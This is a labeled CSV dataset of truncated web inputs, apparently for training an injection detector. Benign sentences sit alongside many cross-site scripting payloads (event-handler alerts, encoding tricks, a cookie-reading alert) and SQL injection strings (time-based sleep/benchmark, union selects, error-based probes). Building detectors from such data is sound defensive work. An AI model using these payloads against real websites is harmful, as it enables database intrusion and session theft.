Payload,Label,text_label,ID
1' where 3339 = 3339 and 3824 = benchmark ( 500000,2,SQLi,15457
"-6254%' ) ) ) or 1 group by concat ( 0x7171706a71,",2,SQLi,17727
"{""id"":null,""name"":""Uxie""}",0,normal,26890
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,1,XSS,1393
1 ) and 3707 = ( select count ( * ) from sysibm.sy,2,SQLi,22236
"<canvas oncut=""alert(1)"" contenteditable>test</can",1,XSS,7440
"Scroll down to the ""Capture screenshot"" option and",0,normal,25697
"<tt draggable=""true"" ondragleave=""alert(1)"">test</",1,XSS,8805
Where's the tattoo parlor?,0,normal,23616
"<body onMouseEnter body onMouseEnter=""javascript:j",1,XSS,372
"<datalist draggable=""true"" ondragenter=""alert(1)"">",1,XSS,6149
1' and 2006 = 2006,2,SQLi,22223
><script+src=https://cse.google.com/api/0076270247,1,XSS,9778
1 ) as ewnv where 3393 = 3393 and 2716 = ( select ,2,SQLi,17799
1' ) and ( 2763 = 4004 ) *4004 and ( 'dtts' = 'dtt,2,SQLi,21109
select ( case when ( 4006 = 1276 ) then 1 else 400,2,SQLi,18643
I need to decide where to go for a hike.,0,normal,23812
<table id=x tabindex=1 onfocus=alert(1)></table>,1,XSS,2214
<svg><content onload=alert(1)></content>,1,XSS,5606
"<META HTTP-EQUIV=""Link"" Content=""<http://.rocks/.c",1,XSS,8884
"<sup onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,5420
"<figure oncut=""alert(1)"" contenteditable>test</fig",1,XSS,4941
"1%"" and 6240 = ( 'qqpjq'|| ( select case 6240 when",2,SQLi,13437
"1 where 8389 = 8389 union all select null,null,nul",2,SQLi,20011
"<body draggable=""true"" ondragenter=""alert(1)"">test",1,XSS,3161
1 ) as duqb where 6495 = 6495,2,SQLi,20654
"<div id=d><x xmlns=""><iframe onload=alert(97)""></d",1,XSS,9161
"ABC<div style=""x:expression\x00(javascript:alert(1",1,XSS,464
"1"" and 4595 = 4595#",2,SQLi,18141
"1"" ) ) ) and ( select 9067 from ( select count ( *",2,SQLi,21704
<script>javascript:alert(1)<\x00/script>,1,XSS,616
"<bdi onbeforecopy=""alert(1)"" contenteditable>test<",1,XSS,6383
-8028%' ) ) ) or 5042 = 5214,2,SQLi,20216
"1"" ) where 2278 = 2278",2,SQLi,16765
")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND",2,SQLi,11301
1 ) or ( select * from ( select ( sleep ( 5 ) ) ) ,2,SQLi,12998
"<SPAN DATASRC=""#"" DATAFLD=""B"" DATAFORMATAS=""HTML"">",1,XSS,8184
"1"" where 4652 = 4652 and 3202 = like ( 'abcdefg',u",2,SQLi,17722
"-5379' ) union all select 4294,4294,4294--",2,SQLi,13514
1' ) and 4380 = 5851 and ( 'cxcl' = 'cxcl,2,SQLi,16577
"<button onkeyup=""alert(1)"" contenteditable>test</b",1,XSS,2718
1 ) where 5234 = 5234 or 8514 = benchmark ( 500000,2,SQLi,22160
Merge the company data.,0,normal,22597
There is simply no point in dividing the spoils am,0,normal,25330
"1' ) where 5276 = 5276 union all select null,null-",2,SQLi,20184
1' ) ) as ovbz where 3203 = 3203 ( select ( case w,2,SQLi,22270
or 'a'='a,2,SQLi,10006
"-1949"" ) ) as urke where 8761 = 8761 union all sel",2,SQLi,13642
"1' union all select null,null--",2,SQLi,21705
"<style>@keyframes slidein {}</style><xmp style=""an",1,XSS,7392
"-2876"" ) or make_set ( 5306 = 6127,6127 ) and ( ""u",2,SQLi,18281
-9225 ) or ( 8258 = 2726 ) *2726 and ( 9900 = 9900,2,SQLi,14359
Please select a date.,0,normal,24323
"<table onmouseleave=""alert(1)"">test</table>",1,XSS,7772
"<p onkeyup=""alert(1)"" contenteditable>test</p>",1,XSS,6224
Where's the parade?,0,normal,23588
The View Mother wavelet option can be used to sele,0,normal,25358
"<base onkeypress=""alert(1)"" contenteditable>test</",1,XSS,7040
1'+ ( select 'mdxt' where 2733 = 2733 or 4240 = ( ,2,SQLi,15477
) ) or ( ( 'x' ) ) = ( ( 'x,2,SQLi,11649
"1' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171",2,SQLi,15900
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",2,SQLi,10573
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71",2,SQLi,15514
Select your study.,0,normal,24991
"1 ) union all select null,null,null,null,null,null",2,SQLi,21067
1 and sleep ( 5 ) #,2,SQLi,21204
"<style>@keyframes x{}</style><bdo style=""animation",1,XSS,6361
He ordered a meal from his favorite restaurant.,0,normal,23890
1' ) as syer where 3141 = 3141 rlike ( select ( ca,2,SQLi,20379
"<caption ondblclick=""alert(1)"">test</caption>",1,XSS,6694
"Additionally, the adjustable roller hinges allow y",0,normal,26405
1%' ) ) ) and ( select 9067 from ( select count ( ,2,SQLi,15884
"&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS",1,XSS,1032
"<embed src=""http://corkami.googlecode.com/svn/!svn",1,XSS,9167
"-4230"" ) ) ) union all select 6962,6962,6962,6962,",2,SQLi,18607
jaVas%0Cript:/*--></tit%0le></st%0yle></text%0area,1,XSS,9491
";';;!--"";<;XSS>;=&;{()}",1,XSS,1579
"1%"" and 8514 = ( select count ( * ) from domain.do",2,SQLi,15862
and 1=1â,2,SQLi,9950
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3796
Where's the counseling appointment?,0,normal,23661
1 ) as iuje where 1976 = 1976 and 6537 = dbms_pipe,2,SQLi,20714
"1"" ) ) as jmoy where 9676 = 9676 and char ( 120 ) ",2,SQLi,17554
Select your conquer.,0,normal,25015
<isindex onpointerleave=alert(1)>XSS</isindex>,1,XSS,2919
"<i onpaste=""alert(1)"" contenteditable>test</i>",1,XSS,5589
-4761 order by 1--,2,SQLi,14608
"<select draggable=""true"" ondragend=""alert(1)"">test",1,XSS,6329
Our lumber purchasers visit the sawmills several t,0,normal,25799
"<XML ID=I><X><C><![<IMG SRC=""javas]]<![cript:docum",1,XSS,1517
-5369' ) or 3208 = 6669#,2,SQLi,20699
<form onpointerout=alert(1)>XSS</form>,1,XSS,2373
"<dl onmouseup=""alert(1)"">test</dl>",1,XSS,3435
-6405 ) as ilah where 5145 = 5145 union all select,2,SQLi,18650
"1"" where 9342 = 9342 and 6240 = ( 'qqpjq'|| ( sele",2,SQLi,20866
<a onfocusout=alert(1) tabindex=1 id=x></a><input ,1,XSS,4242
"select count ( * ) from domain.domains as t1,domai",2,SQLi,19776
&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;,1,XSS,1392
<svg><script ?>alert(1),1,XSS,894
"1, ( select * from generate_series ( 9108,9108,cas",2,SQLi,17877
Let's select toppings.,0,normal,24795
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,14040
1%' and 6537 = dbms_pipe.receive_message ( chr ( 7,2,SQLi,22216
1%' ) rlike ( select * from ( select ( sleep ( 5 ),2,SQLi,15190
<embed src=1 onerror=alert(1) type=image/gif>,1,XSS,2935
Or when you see today a long economic expansion an,0,normal,25805
"""))) waitfor delay '0:0:20' --",2,SQLi,10940
The service is going to select popular and recent ,0,normal,25378
du nd his parents have no guts to serve us one the,0,normal,26503
%2BADw-script+AD4-alert(document.location)%2BADw-/,1,XSS,1131
<script>javascript:alert(1)</script>,1,XSS,732
AND 1=utl_inaddr.get_host_address((SELECT DISTINCT,2,SQLi,11113
<blink onblur=alert(1) tabindex=1 id=x></blink><in,1,XSS,3086
<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><,1,XSS,7300
<html id=x tabindex=1 onbeforeactivate=alert(1)></,1,XSS,4591
"-8491"" where 6107 = 6107 or 4493 = utl_inaddr.get_",2,SQLi,12499
"<option onbeforecut=""alert(1)"" contenteditable>tes",1,XSS,2797
"<command onmousedown=""alert(1)"">test</command>",1,XSS,7604
";!--""<XSS>=&{()}",1,XSS,799
"-6971"" or 4747 = dbms_utility.sqlid_to_sqlhash ( (",2,SQLi,17121
select case when 1802 = 7063 then 1 else null end-,2,SQLi,21166
"1 or row ( 1045,7562 ) > ( select count ( * ) ,con",2,SQLi,18631
"<meta http-equiv=""Content-Security-Policy"" content",1,XSS,179
select * from users where id = '1' union select !<,2,SQLi,11472
1 ) ) as aqpy where 4027 = 4027 or 7417 = ( select,2,SQLi,17561
"1 ) ) procedure analyse ( extractvalue ( 9255,conc",2,SQLi,13801
<iframe/onload=alert(/INJECTX/)>,1,XSS,9833
( select * from ( select ( sleep ( 5 ) ) ) srmq ) ,2,SQLi,17177
Select an option.,0,normal,24811
"<a href=""&#x6a avascript:alert(1)"">XSS</a>",1,XSS,199
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,14646
"1"" ) ) ) or 8421 = ( select count ( * ) from gener",2,SQLi,16935
1' in boolean mode ) and 2388 = benchmark ( 500000,2,SQLi,19726
1 order by 1--,2,SQLi,12943
1' ) and 4386 = utl_inaddr.get_host_address ( chr ,2,SQLi,21691
"-3420 where 9681 = 9681 or make_set ( 2438 = 1977,",2,SQLi,16271
"and 1 = ( if ( ( load_file ( char ( 110,46,101,120",2,SQLi,11775
There is a small but very select collection of tre,0,normal,25331
1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +cha,2,SQLi,21247
1'+ ( select 'fpnz' where 1592 = 1592 and ( select,2,SQLi,17527
1' in boolean mode ) and 5981 = 6700,2,SQLi,13280
Whole Foods and Amazon announced that select organ,0,normal,25126
"select count ( * ) from generate_series ( 1,500000",2,SQLi,15106
"<legend oncut=""alert(1)"" contenteditable>test</leg",1,XSS,7536
( select ( case when ( 1570 = 6977 ) then 1 else 1,2,SQLi,20943
1 ) where 8094 = 8094,2,SQLi,15858
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,67
"<listing onkeyup=""alert(1)"" contenteditable>test</",1,XSS,4715
"; if not ( substring ( ( select @@version ) ,24,1 ",2,SQLi,11455
"-7700%' ) union all select 5660,5660,5660,5660,566",2,SQLi,15692
Careful selection.,0,normal,24785
<image onpointerout=alert(1)>XSS</image>,1,XSS,5036
<output id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,6918
<var onfocusout=alert(1) tabindex=1 id=x></var><in,1,XSS,2574
Update the image.,0,normal,22886
"1%"" ) ) ) rlike ( select * from ( select ( sleep (",2,SQLi,20228
1' ) ) ) and 5556 = ( select count ( * ) from all_,2,SQLi,17009
We've been asking respondents to select from the l,0,normal,25165
"<caption onmouseenter=""alert(1)"">test</caption>",1,XSS,6225
<object onerror=javascript:javascript:alert(1)>,1,XSS,788
<canvas onpointerdown=alert(1)>XSS</canvas>,1,XSS,3335
"{""id"":null,""name"":""GourgeistSmall Size""}",0,normal,27104
<figure id=x tabindex=1 onfocusin=alert(1)></figur,1,XSS,6011
"<b oncut=""alert(1)"" contenteditable>test</b>",1,XSS,8337
"-4919 ) union all select 2608,2608,2608,2608,2608,",2,SQLi,16658
power,0,normal,23212
-6370' ) ) as sims where 9388 = 9388 union all sel,2,SQLi,13451
Where's the taxi stand?,0,normal,23500
"<IMG SRC=x onselect=""alert(String.fromCharCode(88,",1,XSS,1193
1%' or 4915 = ( select count ( * ) from domain.dom,2,SQLi,12481
"<a href=""\xE2\x80\x87javascript:javascript:alert(1",1,XSS,516
-4699 ) as mymz where 3405 = 3405 or elt ( 1032 = ,2,SQLi,16865
"<bdi onkeypress=""alert(1)"" contenteditable>test</b",1,XSS,4479
AS INJECTX WHERE 1=1 AND 1=1--,2,SQLi,10235
"1"" ) where 2367 = 2367",2,SQLi,21265
select ( case when ( 1743 = 5698 ) then 1743 else ,2,SQLi,17420
"select count ( * ) from all_users t1,all_users t2,",2,SQLi,21821
1' ) where 1363 = 1363 or char ( 68 ) ||char ( 69 ,2,SQLi,14625
( select ( case when ( 4232 = 4232 ) then ( select,2,SQLi,18985
"-5849 ) union all select 6168,6168,6168,6168,6168,",2,SQLi,17901
"<small onbeforepaste=""alert(1)"" contenteditable>te",1,XSS,6194
1' where 2134 = 2134 rlike ( select ( case when ( ,2,SQLi,14178
"<ruby oncontextmenu=""alert(1)"">test</ruby>",1,XSS,7240
"<source onmouseover=""alert(1)"">test</source>",1,XSS,5756
"SRC=# onmouseover=""alert(document.cookie)",1,XSS,2070
Select a suitable color for your lighting conditio,0,normal,25656
"<menu onbeforecut=""alert(1)"" contenteditable>test<",1,XSS,8239
1 ) ) as svhd where 9761 = 9761,2,SQLi,16255
1 ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ,2,SQLi,15908
&lt;A HREF=&quot;http://0102.0146.0007.00000223/&q,1,XSS,1464
select ( case when ( 2717 = 2634 ) then 2717 else ,2,SQLi,15210
"1' ) and row ( 6237,7469 ) > ( select count ( * ) ",2,SQLi,18258
<style>:target {transform: rotate(180deg);}</style,1,XSS,4579
"?alert(1)"",",1,XSS,9859
Select the perfect dress.,0,normal,24283
<style>:target {color: red;}</style><del id=x styl,1,XSS,7352
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4821
Join race.,0,normal,23088
<script>$.getScript('https://google.com/')</script,1,XSS,221
"-8566"" ) as hnch where 3418 = 3418 union all selec",2,SQLi,12635
1'|| ( select 'yezk' where 2097 = 2097,2,SQLi,19940
"1"" ) where 8702 = 8702 union all select null,null,",2,SQLi,21453
"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( ",2,SQLi,18863
"<big draggable=""true"" ondragend=""alert(1)"">test</b",1,XSS,4251
-6244' ) as szpd where 8445 = 8445 or 2724 in ( ( ,2,SQLi,18435
1'|| ( select 'yydv' from dual where 9639 = 9639,2,SQLi,17445
<noframes onpointermove=alert(1)>XSS</noframes>,1,XSS,6490
"<menu oncut=""alert(1)"" contenteditable>test</menu>",1,XSS,7039
<img src=1 alt=al lang=ert onerror=top[alt+lang](0,1,XSS,9459
-6045 or 8919 = 2827--,2,SQLi,12436
<datalist onblur=alert(1) tabindex=1 id=x></datali,1,XSS,5653
"1"" ) ) as whyr where 9731 = 9731 rlike ( select * ",2,SQLi,17635
Where's the waterfall?,0,normal,23521
Fortnite servers are really bad today / today. Pro,0,normal,26502
-4954' ) or 8571 = 8571--,2,SQLi,21834
"<isindex onmouseup=""alert(1)"">test</isindex>",1,XSS,2883
1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||ch,2,SQLi,18064
1 ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ,2,SQLi,21346
"<a href=""data:text/html;base64_,<svg/onload=\u0061",1,XSS,902
1 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||,2,SQLi,18984
<style>:target {color:red;}</style><legend id=x st,1,XSS,7167
"1' or updatexml ( 1808,concat ( 0x2e,0x7171706a71,",2,SQLi,18683
select * from users where id = 1 + ( \. ) or 1 = 1,2,SQLi,11597
<colgroup id=x tabindex=1 onbeforedeactivate=alert,1,XSS,2183
"<figure onmousedown=""alert(1)"">test</figure>",1,XSS,8491
<script>self['alert'](2)</script>,1,XSS,9716
"1"" ) as jidc where 6093 = 6093 and 9198 = 9198--",2,SQLi,18372
<em onpointerenter=alert(1)>XSS</em>,1,XSS,8222
"If they are not well rooted, leave them until they",0,normal,26053
"{""id"":null,""name"":""Butterfree""}",0,normal,26757
"<noembed onmouseleave=""alert(1)"">test</noembed>",1,XSS,6775
I want to select the right song for the occasion.,0,normal,23774
"1"" ) ) as maxe where 5883 = 5883 union all select ",2,SQLi,14439
1 ) rlike ( select ( case when ( 5477 = 7492 ) the,2,SQLi,14681
) or ( 'x' = 'x,2,SQLi,11443
1' ) as irsh where 4973 = 4973 or 7552 = ( select ,2,SQLi,22215
1' ) where 1424 = 1424 and sleep ( 5 ) --,2,SQLi,16175
Select drive.,0,normal,24646
<header onpointerover=alert(1)>XSS</header>,1,XSS,7260
"<title draggable=""true"" ondragend=""alert(1)"">test<",1,XSS,2582
javascript:alert('');,1,XSS,7969
Select buy.,0,normal,24558
"<isindex oncut=""alert(1)"" contenteditable>test</is",1,XSS,2158
"<IMG SRC=""jav&#x0A;ascript:alert('');"">",1,XSS,4343
"<SCRIPT/XSS SRC=""http://google.com""></SCRIPT>",1,XSS,9565
"{""id"":null,""name"":""darkness""}",0,normal,27422
1' ) as xskm where 3525 = 3525 and 2435 = 6513,2,SQLi,22354
1' and 3707 = ( select count ( * ) from sysibm.sys,2,SQLi,13746
&#x000003c,1,XSS,1075
"-2953"" ) or 4493 = utl_inaddr.get_host_address ( c",2,SQLi,17068
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4533
"<wbr onbeforecopy=""alert(1)"" contenteditable>test<",1,XSS,3162
Where's the jogging track?,0,normal,23597
<svg><progress onload=alert(1)></progress>,1,XSS,2989
"<fieldset oncopy=""alert(1)"" contenteditable>test</",1,XSS,1884
"1%' ) ) union all select null,null,null,null,null,",2,SQLi,18327
1'+ ( select bptu where 7356 = 7356 ( select ( cas,2,SQLi,19683
1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ,2,SQLi,19921
<meta id=x tabindex=1 onfocus=alert(1)></meta>,1,XSS,5977
"<th onkeyup=""alert(1)"" contenteditable>test</th>",1,XSS,3732
"<a href=""\xC2\xA0javascript:javascript:alert(1)"" i",1,XSS,491
"<IMG SRC=x onresize=""alert(String.fromCharCode(88,",1,XSS,1183
&lt;DIV STYLE=&quot;background-image: url(&amp;#1;,1,XSS,1377
<style>:target {color:red;}</style><td id=x style=,1,XSS,5017
"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( ran",2,SQLi,16237
"1"" ) ) union all select null,null,null,null,null,n",2,SQLi,17013
"<image onmouseover=""alert(1)"">test</image>",1,XSS,4761
ORDER BY 3,2,SQLi,10307
It premieres on Netflix and in select theaters on ,0,normal,25957
"<tfoot oncut=""alert(1)"" contenteditable>test</tfoo",1,XSS,6043
<style>:target {color: red;}</style><style id=x st,1,XSS,2843
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,4183
-9340 ) where 5462 = 5462 or 3038 = 3038,2,SQLi,18648
"<html draggable=""true"" ondrag=""alert(1)"">test</htm",1,XSS,4089
you are hence selected to do sth,0,normal,25104
"<menuitem onmouseleave=""alert(1)"">test</menuitem>",1,XSS,2889
<thead onpointerleave=alert(1)>XSS</thead>,1,XSS,8879
"-1134"" union all select 4865,4865,4865,4865,4865#",2,SQLi,20926
1 ) as biup where 1414 = 1414 union all select nul,2,SQLi,12274
<frame id=x tabindex=1 onbeforeactivate=alert(1)><,1,XSS,6674
"1 procedure analyse ( extractvalue ( 9255,concat (",2,SQLi,15000
<input autofocus onblur=alert(1)>,1,XSS,9214
1' ) order by 1--,2,SQLi,17753
Select van.,0,normal,24705
"-3853"" ) where 4626 = 4626 union all select 4626,4",2,SQLi,12584
"1"" ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ""zx",2,SQLi,19026
"{""id"":null,""name"":""hurry ought""}",0,normal,26885
"<dir onkeydown=""alert(1)"" contenteditable>test</di",1,XSS,5605
Care should be taken in planting to select a spot ,0,normal,26292
-3362' where 6567 = 6567 or 1 group by concat ( 0x,2,SQLi,13924
"<IMG SRC="" &#14; javascript:alert('');"">",1,XSS,5733
"1 ) where 2044 = 2044 or elt ( 6272 = 6272,sleep (",2,SQLi,14748
"<table draggable=""true"" ondrag=""alert(1)"">test</ta",1,XSS,5299
Delete files.,0,normal,23010
-7248' ) where 4626 = 4626 or 1 group by concat ( ,2,SQLi,12982
1' ) ) as nsfx where 9553 = 9553 rlike sleep ( 5 ),2,SQLi,19325
"{""id"":null,""firstName"":""Juay"",""lastName"":""Yew Hai""",0,normal,26794
Delete the tweet.,0,normal,22884
"1' union all select null,null,null,null,null,null,",2,SQLi,17699
hi or a=a,2,SQLi,10174
1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( ,2,SQLi,20921
declare @q nvarchar (200) 0x730065006c00650063 ...,2,SQLi,10068
admin' ) or '1' = '1'--,2,SQLi,11541
"<noembed onmouseover=""alert(1)"">test</noembed>",1,XSS,7672
<style>:target {color: red;}</style><datalist id=x,1,XSS,6872
"{""id"":null,""firstName"":""Heng Fok"",""lastName"":""Wong",0,normal,27554
"{""id"":null,""name"":""Bengal Tiger""}",0,normal,27578
"-5771' ) ) union all select 2833,2833,2833,2833,28",2,SQLi,12995
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10475
1â²) and '1â²='1â,2,SQLi,9946
<button onPause=javascript:alert(1)>,1,XSS,9646
"-4541"" ) ) or make_set ( 4821 = 5233,5233 ) and ( ",2,SQLi,14895
end and ( ( 'eqoc' like 'eqoc,2,SQLi,12664
"{""id"":null,""firstName"":""Ign"",""lastName"":""Miao"",""sp",0,normal,27239
<strike id=x tabindex=1 onactivate=alert(1)></stri,1,XSS,6684
"<button onmouseup=""alert(1)"">test</button>",1,XSS,5431
"<iframe src=""http://example.com/"" style=""width:800",1,XSS,9193
"<address draggable=""true"" ondragenter=""alert(1)"">t",1,XSS,3789
"{""id"":null,""name"":""Gardevoir""}",0,normal,27364
<noscript id=x tabindex=1 onfocusin=alert(1)></nos,1,XSS,1786
"<object draggable=""true"" ondragend=""alert(1)"">test",1,XSS,7119
1 where 7425 = 7425 rlike ( select ( case when ( 4,2,SQLi,16881
<td onpointerover=alert(1)>XSS</td>,1,XSS,4686
"union (select NULL, (select @@version)) --",2,SQLi,10049
"-9601' ) ) or 1 group by concat ( 0x7171706a71, ( ",2,SQLi,21163
<optgroup onpointerout=alert(1)>XSS</optgroup>,1,XSS,2040
"1"" ) ) as bovm where 5560 = 5560 union all select ",2,SQLi,20428
<script>alert(document.getElementsByTagName('html',1,XSS,9284
1' where 5023 = 5023 and 3580 = ( select count ( *,2,SQLi,19284
Here are some photos and select translations from ,0,normal,26104
"1"" ) ) as khqq where 3637 = 3637 and 8407 = ( sele",2,SQLi,12438
It premieres on Netflix and in select theaters in ,0,normal,25958
"<mark draggable=""true"" ondrag=""alert(1)"">test</mar",1,XSS,7879
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3343
1'+ ( select bgbq where 1589 = 1589 and 3715 in ( ,2,SQLi,19040
You can choose the color of the paper and/or envel,0,normal,25096
<title onpointermove=alert(1)>XSS</title>,1,XSS,5914
To ensure success with finer pitch requirements it,0,normal,25269
-6487 ) or 6872 = 6872 and ( 7688 = 7688,2,SQLi,21321
"<style>@keyframes x{}</style><div style=""animation",1,XSS,8517
<textarea autofocus onfocus=alert(1)>test</textare,1,XSS,2033
"-9932"" union all select 4049,4049,4049--",2,SQLi,17200
"RC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9",1,XSS,7238
-5774' where 3632 = 3632 or ( 3177 = 4222 ) *4222-,2,SQLi,12758
"1"" ) ) and row ( 6237,7469 ) > ( select count ( * ",2,SQLi,15330
where,0,normal,26526
-1700%' or 4149 = 3391#,2,SQLi,13986
&#x000003c;,1,XSS,1081
"1"" ) as dlfq where 8410 = 8410",2,SQLi,18613
